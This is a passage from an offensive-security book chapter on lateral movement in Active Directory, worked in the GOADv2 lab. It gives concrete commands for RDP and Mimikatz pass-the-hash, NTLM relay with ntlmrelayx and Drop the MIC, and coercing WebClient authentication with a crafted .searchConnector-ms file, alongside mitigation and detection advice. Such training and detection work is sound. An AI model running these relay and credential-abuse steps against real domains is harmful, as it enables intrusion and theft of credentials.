<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer138">
<h1 class="chapter-number" id="_idParaDest-89"><a id="_idTextAnchor093"/>5</h1>
<h1 id="_idParaDest-90"><a id="_idTextAnchor094"/>Lateral Movement in Domain and Across Forests</h1>
<p>After an adversary establishes a foothold in the environment and/or harvests valid credentials, the next step is usually<a id="_idIndexMarker286"/> lateral movement. Lateral movement is a set of techniques that allows an attacker to move deeper into the target environment and search for high-value assets and sensitive data, including <span class="No-Break">new credentials.</span></p>
<p>We will start with a scenario in which an attacker obtained a clear-text password (e.g., successful password spray attack) and now tries to blend in with usual environment traffic by abusing administrative protocols. As a next step, we will discuss how to relay the hash and the prerequisites<a id="_idIndexMarker287"/> for this move to be successful. To perform lateral movement, the attacker does not only require an <strong class="bold">New Technology LAN Manager</strong> (<strong class="bold">NTLM</strong>) response or clear-text password; it can be any other form of credential material: NT hash, key, or ticket. As Kerberos is recommended by Microsoft as the primary secure authentication protocol in the domain, we will cover three types of Kerberos delegation in detail. As the last step, we will focus on lateral movement between forests only and how a security mechanism called SID filtering can <span class="No-Break">stop it.</span></p>
<p>In this chapter, we are going to cover the following <span class="No-Break">main topics:</span></p>
<ul>
<li>Abusing administrative protocols for <span class="No-Break">lateral movement</span></li>
<li>Relay <span class="No-Break">the hash</span></li>
<li>Pass <span class="No-Break">the whatever</span></li>
<li><span class="No-Break">Kerberos delegation</span></li>
<li>Movement between domains <span class="No-Break">and forests</span></li>
</ul>
<h1 id="_idParaDest-91"><a id="_idTextAnchor095"/>Technical requirements</h1>
<p>In this chapter, you will need to have access to <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation or Oracle VirtualBox with at least 16 GB of RAM, 8 CPU cores, and 55 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>A Linux-based operating system is <span class="No-Break">strongly recommended</span></li>
<li>Installed Vagrant with a plugin for the corresponding virtualization platform <span class="No-Break">and Ansible</span></li>
<li>GOADv2 project with all machines up <span class="No-Break">and running</span></li>
</ul>
<h1 id="_idParaDest-92"><a id="_idTextAnchor096"/>Usage of administration protocols in the domain</h1>
<p>In this section, we will cover various administration protocols<a id="_idIndexMarker288"/> that are usually used by IT staff inside the domain for day-to-day support activities. We will discuss PowerShell features such as PSRemoting and <strong class="bold">Just Enough Administration</strong> (<strong class="bold">JEA</strong>). The <strong class="bold">Remote Desktop Protocol</strong> (<strong class="bold">RDP</strong>) is one of the most common<a id="_idIndexMarker289"/> protocols used by administration as well. We will briefly<a id="_idIndexMarker290"/> go through other protocols that can be used for lateral movement such as WMI, SMB, DCOM, and PSExec <span class="No-Break">from Impacket.</span></p>
<h2 id="_idParaDest-93"><a id="_idTextAnchor097"/>PSRemoting and JEA</h2>
<p><strong class="bold">PSRemoting</strong> allows you to connect to multiple computers<a id="_idIndexMarker291"/> and run the commands<a id="_idIndexMarker292"/> on them. Another option is that you can have a one-to-one interactive shell on the target machine. For simplicity, you can think of it as SSH, but for Windows to run PowerShell commands. In a nutshell, the client tries to connect<a id="_idIndexMarker293"/> to a tiny web server running on a destination server called the <strong class="bold">WinRM listener</strong>. HTTP or HTTPS protocols can be used to provide transport for authentication. We can list available listeners by running the <span class="No-Break">following command:</span></p>
<pre class="console">
winrm e winrm/config/listener</pre> <p>The output of this command on SRV02 is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer092">
<img alt="Figure 5.1 – WinRM listeners on SRV02" height="363" src="image/B18964_05_01.jpg" width="875"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.1 – WinRM listeners on SRV02</p>
<p>Let’s log in to the remote computer with the <span class="No-Break">following command:</span></p>
<pre class="console">
Enter-PSSession -ComputerName castelblack</pre> <p>The traffic capture during authentication will be as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer093">
<img alt="Figure 5.2 – PSRemoting login traffic capture" height="341" src="image/B18964_05_02.jpg" width="1299"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.2 – PSRemoting login traffic capture</p>
<p>If we are on a Linux machine, we can try the <strong class="source-inline">evil-winrm</strong> tool[<span class="No-Break">1</span>] to get an interactive shell. Also, PSRemoting<a id="_idIndexMarker294"/> supports different authentication protocols. Our focus<a id="_idIndexMarker295"/> will be only on Kerberos authentication. To be able to log in to the machine, the user should be a part of the <strong class="source-inline">Administrators</strong> or <strong class="source-inline">Remote Management Users</strong> groups. Also, it is important to mention that configuring a list of trusted machines by filling in the <strong class="bold">Trusted Hosts</strong> option in WinRM configuration and applying HTTPS as a transport protocol will benefit the security of <span class="No-Break">the environment.</span></p>
<p>In some environments, you can encounter <strong class="bold">Just In Time</strong> (<strong class="bold">JIT</strong>) administration and/or<strong class="bold"> </strong>JEA. JIT <a id="_idIndexMarker296"/>is a security concept in which administrative rights can be assigned and revoked on a time-dependent basis. JEA<a id="_idIndexMarker297"/> is a concept that limits<a id="_idIndexMarker298"/> what certain users can do remotely on the machine. There is a good example of setting up JEA in a lab environment for training purposes[2]. We are not going to cover this in detail, but it is important to mention such security mechanisms. As usual, every security boundary can be bypassed if <span class="No-Break">configured insecurely.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A good presentation with tips to escape can be found here: <a href="https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf">https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf</a>. A great toolkit called RACE[3] that can assist in getting<a id="_idIndexMarker299"/> persistence through JEA was released by <span class="No-Break"><em class="italic">Nikhil Mittal</em></span><span class="No-Break">.</span></p>
<p>Now, let’s discuss the second most common administration protocol, which <span class="No-Break">is RDP.</span></p>
<h2 id="_idParaDest-94"><a id="_idTextAnchor098"/>RDP</h2>
<p>RDP allows you<a id="_idIndexMarker300"/> to connect to a remote computer<a id="_idIndexMarker301"/> and provides the same experience as if you were sitting in front of it, including the GUI as well. If you have the clear-text credentials of a compromised user, you can use RDP to access the target machine. This information<a id="_idIndexMarker302"/> can be found by the BloodHound tool during<a id="_idIndexMarker303"/> enumeration. To identify such users, BloodHound collects members of the <strong class="source-inline">Remote Desktop Users</strong> group on the computer and principals with <strong class="source-inline">SeRemoteInteractiveLoginPrivilege</strong> rights in the <strong class="bold">Local Security Authority</strong> (<strong class="bold">LSA</strong>) policy. If there is a user who meets both criteria, then the <strong class="bold">CanRDP</strong> edge appears[<span class="No-Break">4</span>]. For connection, we can<a id="_idIndexMarker304"/> use a Windows built-in client or <strong class="source-inline">xfreerdp</strong> from <span class="No-Break">Kali Linux.</span></p>
<p>If we have only the NT hash, we can<a id="_idIndexMarker305"/> abuse the feature called <strong class="source-inline">Restricted Admin</strong> mode. In this mode, credentials won’t be<a id="_idIndexMarker306"/> sent to the remote computer and will not be stored<a id="_idIndexMarker307"/> in memory, because it transforms the logon to a <strong class="bold">Network Logon (Type 3)</strong> instead of a <strong class="bold">Remote Interactive Logon (Type 10)</strong>. This looks like a good security measure, but this is exactly why we can pass the hash to RDP. The main caveat is that the compromised user must be in the <strong class="source-inline">Administrator</strong> group and this mode needs to be enabled. Let us quickly demonstrate this mode in practice. To log in as <strong class="source-inline">eddard.stark</strong> in winterfell, we can use a Windows Native Client by doing pass-the-hash with Mimikatz first or <strong class="source-inline">xfreerdp</strong> from a <span class="No-Break">Linux machine:</span></p>
<pre class="console">
xfreerdp /u:eddard.stark /d:north.sevenkingdoms.local /pth:D977B98C6C9282C5C478BE1D97B237B8 /v:192.168.56.11</pre> <p>The result of running this command is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer094">
<img alt="Figure 5.3 – Restricted Admin mode is not enabled" height="230" src="image/B18964_05_03.jpg" width="564"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.3 – Restricted Admin mode is not enabled</p>
<p>Luckily, there<a id="_idIndexMarker308"/> is a tool called <strong class="source-inline">RestrictedAdmin</strong> available<a id="_idIndexMarker309"/> on GitHub[5]. However, it is not OpSec safe, because it changes the registry key that is highly likely to be monitored by the blue team; different types of logon will be in the event logs as well. Running the following commands will enable this mode on the <span class="No-Break">remote machine:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer095">
<img alt="Figure 5.4 – Enabling Restricted Admin mode" height="188" src="image/B18964_05_04.jpg" width="497"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.4 – Enabling Restricted Admin mode</p>
<p>Now, we will be able to log<a id="_idIndexMarker310"/> in using pass-the-hash<a id="_idIndexMarker311"/> <span class="No-Break">to RDP:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer096">
<img alt="Figure 5.5 – Successful login to the target machine over RDP" height="231" src="image/B18964_05_05.jpg" width="576"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.5 – Successful login to the target machine over RDP</p>
<p>Two more things worth<a id="_idIndexMarker312"/> sharing regarding RDP: firstly, thanks to the <strong class="bold">SharpRDP</strong> tool[6], we can use RDP for the purposes of non-graphical authenticated remote command execution against a target in our preferable <span class="No-Break">command-and-control software.</span></p>
<p>Secondly, we can dump RDP credentials<a id="_idIndexMarker313"/> from the endpoint in different ways such as dumping from process memory, using <strong class="bold">SharpRDPThief</strong>[7], or from Windows Credentials Manager <span class="No-Break">using Mimikatz.</span></p>
<p>A possible mitigation recommendation<a id="_idIndexMarker314"/> is to protect Remote Desktop credentials with <strong class="bold">Windows Defender Remote Credential Guard</strong>. It allows only Kerberos for authentication<a id="_idIndexMarker315"/> and prevents pass-the-hash and credential reuse after disconnecting. <strong class="bold">Multi-factor authentication</strong> (<strong class="bold">MFA</strong>) is another good option<a id="_idIndexMarker316"/> to keep<a id="_idIndexMarker317"/> <span class="No-Break">in mind.</span></p>
<p>Next, we will discuss ways to do lateral movement using Impacket. These protocols can be abused from Windows tooling as well, but introducing Impacket is important for the sake of knowledge and <span class="No-Break">further chapters.</span></p>
<h2 id="_idParaDest-95"><a id="_idTextAnchor099"/>Other protocols with Impacket</h2>
<p><strong class="bold">Impacket</strong>[8] is a collection of Python classes<a id="_idIndexMarker318"/> that were created for working<a id="_idIndexMarker319"/> with various network protocols. In the <strong class="source-inline">example</strong> folder, there are tons of useful Python scripts that allow you various methods for lateral movement, dealing with Kerberos, accessing Windows secrets, and performing relay attacks. This toolkit is a great alternative to tools such as Rubeus, which are not available on Linux. We have the following lateral movement options<a id="_idIndexMarker320"/> in Impacket to <span class="No-Break">choose from:</span></p>
<ul>
<li><strong class="source-inline">PSExec</strong> is loud and catches defenders’ attention quite quickly, as it uploads executables and creates <span class="No-Break">a service</span></li>
<li><strong class="source-inline">SmbExec</strong> creates a service on every request but does not <span class="No-Break">upload anything</span></li>
<li><strong class="source-inline">AtExec</strong> creates scheduled tasks in <strong class="source-inline">C:\Windows\System32\Tasks\</strong> as <strong class="source-inline">SYSTEM</strong> with a random name and provides output in a file located <span class="No-Break">at </span><span class="No-Break"><strong class="source-inline">C:\Windows\Temp\</strong></span></li>
<li><strong class="source-inline">DCOMExec</strong> requires <span class="No-Break">file creation</span></li>
<li><strong class="source-inline">WMIExec</strong> requires file creation <span class="No-Break">and deletion</span></li>
</ul>
<p>Most of these techniques can be caught with enhanced monitoring such as Sysmon and correlation of the Windows <span class="No-Break">event logs.</span></p>
<p>Also, a good prevention strategy is to deploy <strong class="bold">Attack Surface Reduction</strong> (<strong class="bold">ASR</strong>) rules. ASR prevents<a id="_idIndexMarker321"/> typical malicious actions on the endpoints such as process creation from different applications, prevents execution of files depending on their origin<a id="_idIndexMarker322"/> and various<a id="_idIndexMarker323"/> conditions, vulnerable signed drivers loading, <span class="No-Break">and more.</span></p>
<p>In the next section, we will cover NTLM response relay attacks and different types <span class="No-Break">of hashes.</span></p>
<h1 id="_idParaDest-96"><a id="_idTextAnchor100"/>Relaying the hash</h1>
<p>In the previous chapter, we covered different<a id="_idIndexMarker324"/> possibilities to capture the NTLM response by forcing authentication or using MitM. Now we are getting to the answer of why we want to capture responses. Before we jump into practice, some theory concepts and caveats need to be <span class="No-Break">explained first.</span></p>
<p>First, there are two versions of the NTLM protocol (v1 and v2). Next, NTLM authentication messages can be relayed cross-protocol as they are protocol-independent. It is important to understand what protocol was used to capture NTLM authentication and what protocol we are planning to relay it over. The following mindmap was created by <em class="italic">nwodtuhs</em> and is a good reference for <span class="No-Break">our discussion.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer097">
<img alt="Figure 5.6 – NTLM relay" height="873" src="image/B18964_05_06.jpg" width="1180"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.6 – NTLM relay</p>
<p>Let us focus more on an important<a id="_idIndexMarker325"/> topic, which is signing, especially for SMB and LDAP. Signing configuration and existence is controlled by settings on the client and server side. For SMB, it will depend on the protocol version and whether the server is a domain controller. The key takeaway is that signing for SMB v2 must be required by the server and/or client. LDAP behaves differently and packets will be signed if both sides are able to do so, but is not <span class="No-Break">specifically required.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Notable examples of LDAP<a id="_idIndexMarker326"/> and SMB signing configuration and negotiation can be found <span class="No-Break">here: </span><a href="https://en.hackndo.com/ntlm-relay/"><span class="No-Break">https://en.hackndo.com/ntlm-relay/</span></a><span class="No-Break">.</span></p>
<p>But session signing is negotiated during<a id="_idIndexMarker327"/> the NTLM authentication, maybe we can try to unset it? Here, we will learn more about <strong class="bold">Message Integrity Code</strong> (<strong class="bold">MIC</strong>), which is available only in NTLM v2. The <strong class="source-inline">MIC</strong> is a signature resulting from the <strong class="source-inline">HMAC_MD5</strong> function calculated over a few parameters. The most important parameters are the session key, which depends on the client’s secret, and the value, which states whether the signing is negotiated. If we do not know<a id="_idIndexMarker328"/> the client’s secret, the <strong class="source-inline">MIC</strong> can’t be changed. However, two vulnerabilities<a id="_idIndexMarker329"/> were found by researchers from a company called <em class="italic">Preempt</em> and were conveniently named <strong class="bold">Drop the MIC</strong> (<strong class="bold">CVE-2019-1040</strong>) and <strong class="bold">Drop the MIC 2</strong> (<strong class="bold">CVE-2019-1166</strong>), allowing to simply remove <span class="No-Break">the </span><span class="No-Break"><strong class="source-inline">MIC</strong></span><span class="No-Break">.</span></p>
<p>Another vulnerability, <strong class="bold">CVE-2019-1019</strong>, which was a successor of <strong class="bold">CVE-2015-005</strong>, allows the retrieval<a id="_idIndexMarker330"/> of the session key<a id="_idIndexMarker331"/> for any authentication attempt by missing the computer name while establishing the <strong class="source-inline">NETLOGON</strong> channel. A detailed attack walk-through can be <span class="No-Break">found here[9</span><span class="No-Break">].</span></p>
<p>The last thing we are going to cover is <strong class="bold">Extended Protection for Authentication</strong> (<strong class="bold">EPA</strong>). It was introduced against<a id="_idIndexMarker332"/> cross-protocol relay allowing it to bind the authentication<a id="_idIndexMarker333"/> layer with the protocol. If the TLS channel is required to be bound (LDAPS or HTTPS), the server<a id="_idIndexMarker334"/> certificate hash (called <strong class="source-inline">Channel Binding Token</strong>) will be used as a part of the NTLM response, meaning that spoofing is not possible without knowing the client’s secret. For non-TLS protocols<a id="_idIndexMarker335"/> such as CIFS or HTTP, the field is called <strong class="source-inline">Service Binding Information</strong>. The idea is very similar to TLS binding, but instead of using the certificate’s hash target, the <strong class="bold">Service Principal Name</strong> (<strong class="bold">SPN</strong>) will be checked in the NTLM response. In both<a id="_idIndexMarker336"/> cases, a mismatch will lead to an “Access <span class="No-Break">Denied” error.</span></p>
<p>That was a hefty amount of theory! Let’s move on to some practice and see <span class="No-Break">the benefits.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">If something is not going as expected, the following lab creator has your back <span class="No-Break">covered: </span><a href="https://mayfly277.github.io/posts/GOADv2-pwning-part4/"><span class="No-Break">https://mayfly277.github.io/posts/GOADv2-pwning-part4/</span></a><span class="No-Break">.</span></p>
<p>Let us first enumerate machines that do not require SMB signing. We can do it <span class="No-Break">using </span><span class="No-Break"><strong class="source-inline">CrackMapExec</strong></span><span class="No-Break">:</span></p>
<pre class="console">
crackmapexec smb 192.168.56.10-23 --gen-relay-list smb_relay.txt</pre> <p>The following is a list of <span class="No-Break">the machines:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer098">
<img alt="Figure 5.7 – Machines with SMB signing disabled" height="227" src="image/B18964_05_07.jpg" width="852"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.7 – Machines with SMB signing disabled</p>
<p>In the previous chapter, we captured<a id="_idIndexMarker337"/> the NTLM response of <strong class="source-inline">eddard.stark</strong> because of the scheduled task running with a typo in the DNS name. Now, let us use it for relay. We disable SMB and HTTP servers in Responder by editing <strong class="source-inline">/etc/responder/Responder.conf</strong> and running <strong class="source-inline">ntlmrelayx</strong> to dump the SAM database on castelblack as the <strong class="source-inline">eddard.stark</strong> user has administrator rights <span class="No-Break">on it:</span></p>
<pre class="console">
impacket-ntlmrelayx -tf smb_relay.txt -smb2support</pre> <p>The following screenshot<a id="_idIndexMarker338"/> shows the result of dumping the <strong class="bold">Security Accounts Manager</strong> (<span class="No-Break"><strong class="bold">SAM</strong></span><span class="No-Break">) database:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer099">
<img alt="Figure 5.8 – Relay NTLM v2 response and dumping the SAM database" height="645" src="image/B18964_05_08.jpg" width="1143"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.8 – Relay NTLM v2 response and dumping the SAM database</p>
<p>It is important to mention that since <strong class="source-inline">MS08-68</strong>, it is not possible to relay the hash toward itself. There is also an option in <strong class="source-inline">ntlmrelayx (--socks)</strong> to use an SMB connection as a <strong class="source-inline">SOCKS</strong> proxy, avoiding noisy login and not requiring administrative rights on the box. Then, we can use proxy chains to run the tools <span class="No-Break">we want.</span></p>
<p>As a next step, we will use a relay for LDAP<a id="_idIndexMarker339"/> enumeration. We can’t relay the hash that was obtained over SMB as the domain controller requires signing, so we can use the WebDAV service if installed (as shown here by <em class="italic">Jean_Maes_1994</em>: <a href="https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/">https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/</a>) or try <strong class="source-inline">mitm6</strong>. An excellent walk-through of how to use the <strong class="source-inline">mitm6</strong> toolkit was demonstrated by the lab creator, so we will show the WebDAV scenario and apply necessary changes in the lab <span class="No-Break">to </span><span class="No-Break"><strong class="source-inline">castelblack</strong></span><span class="No-Break">.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Before we start, you can read<a id="_idIndexMarker340"/> more information <span class="No-Break">here: </span><a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient"><span class="No-Break">https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient</span></a><span class="No-Break">.</span></p>
<p>As a first preparation step on castelblack, we need to install a feature called <strong class="source-inline">WebDAV Redirector</strong> using PowerShell <span class="No-Break">as </span><span class="No-Break"><strong class="source-inline">Administrator</strong></span><span class="No-Break">:</span></p>
<pre class="console">
Install-WindowsFeature WebDAV-Redirector –Restart</pre> <p>In the following screenshot, we can see that the feature was successfully installed and the service <span class="No-Break">was stopped:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer100">
<img alt="Figure 5.9 – WebClient service was successfully installed" height="181" src="image/B18964_05_09.jpg" width="619"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.9 – WebClient service was successfully installed</p>
<p>Let us now force the WebClient service to start by placing the <strong class="source-inline">.searchConnector-ms</strong> file on the public share, as described by <em class="italic">MDSec</em> researchers, with content such as <span class="No-Break">the following:</span></p>
<pre class="console">
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;searchConnectorDescription &gt; &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt; &lt;description&gt;Microsoft Outlook&lt;/description&gt; &lt;isSearchOnlyItem&gt;false&lt;/isSearchOnlyItem&gt; &lt;includeInStartMenuScope&gt;true&lt;/includeInStartMenuScope&gt; &lt;iconReference&gt;https://192.168.56.22/public/0001.ico&lt;/iconReference&gt; &lt;templateInfo&gt; &lt;folderType&gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}&lt;/folderType&gt; &lt;/templateInfo&gt; &lt;simpleLocation&gt; &lt;url&gt;https://example.com/&lt;/url&gt; &lt;/simpleLocation&gt; &lt;/searchConnectorDescription&gt;</pre> <p>We can then verify that the service<a id="_idIndexMarker341"/> has successfully started. If we do not know any server in the network with a running WebClient service, we can scan the IP range using the <strong class="source-inline">CrackMapExec</strong> <span class="No-Break">module, </span><span class="No-Break"><strong class="source-inline">WebDAV</strong></span><span class="No-Break">:</span></p>
<pre class="console">
crackmapexec smb 192.168.56.0/24 -u arya.stark -p Needle -d north -M webdav</pre> <p>The results of our recon activity are presented in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer101">
<img alt="Figure 5.10 – WebClient service recon" height="359" src="image/B18964_05_10.jpg" width="822"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.10 – WebClient service recon</p>
<p>The next step is to use the coercion method to trigger authentication over HTTP to our Kali machine and then relay it to LDAP. We will need Responder with a disabled HTTP server <span class="No-Break">and </span><span class="No-Break"><strong class="source-inline">ntlmrelayx</strong></span><span class="No-Break">:</span></p>
<pre class="console">
python3 dementor.py -u arya.stark -d north.sevenkingdoms.local -p Needle 192.168.56.100 192.168.56.22</pre> <p>For our exercise, I chose PrinterBug as a coercion<a id="_idIndexMarker342"/> method and its implementation<a id="_idIndexMarker343"/> on Linux via a tool called <strong class="source-inline">dementor</strong>[10]. The following screenshot shows the result of dumping <span class="No-Break">domain information:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer102">
<img alt="Figure 5.11 – Domain enumeration LDAP" height="455" src="image/B18964_05_11.jpg" width="772"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.11 – Domain enumeration LDAP</p>
<p>As the last example, I would like to show <strong class="bold">CVE-2019-1040</strong> in action. <em class="italic">Mayfly</em> introduced a vulnerable server in the lab. To find vulnerable<a id="_idIndexMarker344"/> boxes, we can use a scanner created by <em class="italic">_dirkjan</em>[11]. The following command will check whether the target <span class="No-Break">is vulnerable:</span></p>
<pre class="console">
python3 scan.py essos/khal.drogo:horse@192.168.56.23</pre> <p>If we try to relay SMB to LDAP in the patched system, it will lead to the following error <span class="No-Break">in </span><span class="No-Break"><strong class="source-inline">ntlmrelayx</strong></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer103">
<img alt="Figure 5.12 – SMB to LDAP relay failed" height="111" src="image/B18964_05_12.jpg" width="838"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.12 – SMB to LDAP relay failed</p>
<p>But if there is a <em class="italic">Drop the MIC</em> vulnerability, we can add the <strong class="source-inline">-–remove-mic</strong> flag and, as a result, successfully relay, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer104">
<img alt="Figure 5.13 – Drop the MIC allowed to relay" height="252" src="image/B18964_05_13.jpg" width="835"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.13 – Drop the MIC allowed to relay</p>
<p class="callout-heading">Note</p>
<p class="callout">To get more information<a id="_idIndexMarker345"/> on how to prevent certain types of relays, we can use the Nettitude blog post (<a href="https://labs.nettitude.com/blog/network-relaying-abuse-windows-domain/">https://labs.nettitude.com/blog/network-relaying-abuse-windows-domain/</a>) as a good <span class="No-Break">starting point.</span></p>
<p>Killing relay attack<a id="_idIndexMarker346"/> vectors will require a significant number of services to be reviewed and tested, so signing can be enforced for SMB, LDAP, and EPA for LDAPS and HTTPS. Fine-tune IPv6, and disable broadcast protocols and unused services as a domain-hardening exercise. Try to use only Kerberos for authentication in the domain, but if it is not possible, then only use NTLM v2. NTLM v1 should be <span class="No-Break">disabled entirely!</span></p>
<p>In the next section, we will discuss the ways to perform lateral movement after the attacker is able to compromise the machine and dump credentials in the form of an NT hash, AES key, or <span class="No-Break">a ticket.</span></p>
<h1 id="_idParaDest-97"><a id="_idTextAnchor101"/>Pass-the-whatever</h1>
<p>This section is about impersonation. Let's say an attacker<a id="_idIndexMarker347"/> compromised a machine and dumped hashed credentials from the LSASS process using one of many available ways. Usually, the next step is to perform lateral movement by starting a new logon session and trying to access other company resources. We will discuss the most common ways to perform such an activity together with OpSec considerations. <strong class="bold">Pass the certificate</strong> will be covered in <a href="B18964_08.xhtml#_idTextAnchor163"><span class="No-Break"><em class="italic">Chapter 8</em></span></a> related to <em class="italic">Active Directory </em><span class="No-Break"><em class="italic">Certificate Services</em></span><span class="No-Break">.</span></p>
<h2 id="_idParaDest-98"><a id="_idTextAnchor102"/>Pass-the-hash</h2>
<p>We are going to start<a id="_idIndexMarker348"/> with good old pass-the-hash. This method of authentication itself is quite straightforward. It relies only on the NTLM protocol, not touching Kerberos at all. This technique can be used for local and domain accounts. To perform a pass-the-hash attack, the attacker needs to have administrative privileges on <span class="No-Break">the box.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">There is a detailed and well-written<a id="_idIndexMarker349"/> description of what is happening under the hood by <strong class="source-inline">hackndo</strong> in his blog post <span class="No-Break">at </span><a href="https://en.hackndo.com/pass-the-hash/"><span class="No-Break">https://en.hackndo.com/pass-the-hash/</span></a><span class="No-Break">.</span></p>
<p>The technique can be executed with the help of Mimikatz in an elevated context. In our example, an attacker was able to compromise a local administrative <strong class="source-inline">vagrant</strong> user and dump an NT hash for the user with domain administrator privileges. In our case, it is <strong class="source-inline">robert.baratheon</strong> in the <strong class="source-inline">sevenkingdoms</strong> domain. We can perform pass-the-hash by running the <span class="No-Break">following command:</span></p>
<pre class="console">
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:robert.baratheon /ntlm:9029CF007326107EB1C519C84EA60DBE /domain:sevenkingdoms.local /run:powershell.exe"'</pre> <p>The execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer105">
<img alt="Figure 5.14 – Pass-the-hash with Mimikatz" height="845" src="image/B18964_05_14.jpg" width="836"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.14 – Pass-the-hash with Mimikatz</p>
<p>As a result, we will have a new PowerShell<a id="_idIndexMarker350"/> window opened. Do not be confused that we are shown as a <strong class="source-inline">vagrant</strong> user in the new PowerShell session. In reality, we have impersonated <strong class="source-inline">robert.baratheon</strong>. The following screenshot proves it in the <span class="No-Break">PSRemoting session.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer106">
<img alt="Figure 5.15 – Pass-the-hash used to access the domain controller" height="140" src="image/B18964_05_15.jpg" width="664"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.15 – Pass-the-hash used to access the domain controller</p>
<p>Also, there is a caveat called <strong class="bold">User Account Control</strong> (<strong class="bold">UAC</strong>), which can limit remote administration operations<a id="_idIndexMarker351"/> on newly compromised machines after we successfully move laterally. It will depend on two registry values, <strong class="source-inline">LocalAccountTokenFilterPolicy</strong> and <strong class="source-inline">FilterAdministratorToken</strong>, located in <strong class="source-inline">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</strong>. By default, only a built-in administrator with a <strong class="bold">Relative Identifier</strong> (<strong class="bold">RID</strong>) of <strong class="source-inline">500</strong> and domain accounts with local admin<a id="_idIndexMarker352"/> rights can perform remote administration tasks without UAC <span class="No-Break">being activated.</span></p>
<p>Now, we can discuss the detection<a id="_idIndexMarker353"/> of this technique. The best way to detect pass-the-hash is to review the <strong class="source-inline">4624</strong> and <strong class="source-inline">4672</strong> events on the source host. Event <strong class="source-inline">4624</strong> has a logon type of <strong class="bold">9</strong> and a logon process of <strong class="source-inline">seclogo</strong>, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer107">
<img alt="Figure 5.16 – Event 4624 on the host where the pass-the-hash attack was executed" height="381" src="image/B18964_05_16.jpg" width="421"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.16 – Event 4624 on the host where the pass-the-hash attack was executed</p>
<p>Event ID <strong class="source-inline">4672</strong> identifies privileged logon for the current logged-in account, not the new account, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer108">
<img alt="Figure 5.17 – Event 4672 on the host where the pass-the-hash attack was executed" height="110" src="image/B18964_05_17.jpg" width="314"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 5.17 – Event 4672 on the host where the pass-the-hash attack was executed</p>
<p>The domain controller would not have corresponding event IDs <strong class="source-inline">4768</strong> and <strong class="source-inline">4769</strong>. Also, we should not forget that by using Sysmon, we can reliably detect access to the LSASS process, which happens when Mimikatz is used for pass-the-hash. By combining both events, we can reliably<a id="_idIndexMarker354"/> <span class="No-Break">detect pass-the-hash.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Defender for Identity by Microsoft stated that it can detect pass-the-hash attacks by analyzing whether the NT hash<a id="_idIndexMarker355"/> used was from computers that the user uses <span class="No-Break">regularly (</span><a href="https://learn.microsoft.com/en-us/defender-for-identity/lateral-movement-alerts"><span class="No-Break">https://learn.microsoft.com/en-us/defender-for-identity/lateral-movement-alerts</span></a><span class="No-Break">).</span></p>
<h2 id="_idParaDest-99"><a id="_idTextAnchor103"/>Pass-the-key and overpass-the-hash</h2>
